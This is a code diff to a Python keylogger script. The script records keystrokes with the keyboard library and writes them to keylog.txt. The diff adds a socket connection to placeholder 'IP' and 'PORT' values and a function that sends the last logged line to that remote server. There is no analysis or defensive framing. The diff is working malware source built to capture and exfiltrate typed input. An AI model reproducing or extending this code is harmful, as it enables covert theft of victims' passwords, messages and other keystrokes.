@@ -1,5 +1,14 @@
 import keyboard
 import datetime
+import socket
+
+
+def connect():
+    ip = 'IP'
+    port = 'PORT'
+    s = socket.socket()
+    s.connect((ip, port))
+    return s
 
 
 def write_to_file(recorded):
@@ -17,6 +26,16 @@ def write_to_file(recorded):
     f.close()
 
 
+def send_to_server(connection):
+    with open('keylog.txt', 'r') as f:
+        lines = f.readlines()
+        connection.send(lines[-1].encode('utf-8'))
+    connection.close()
+
+
 recorded = keyboard.record(until='esc')
-recorded = [event for event in recorded if event.event_type == 'down']
+recorded = [event for event in recorded if event.event_type == 'down'][:-1]
+
+connection = connect()
 write_to_file(recorded)
+send_to_server(connection)
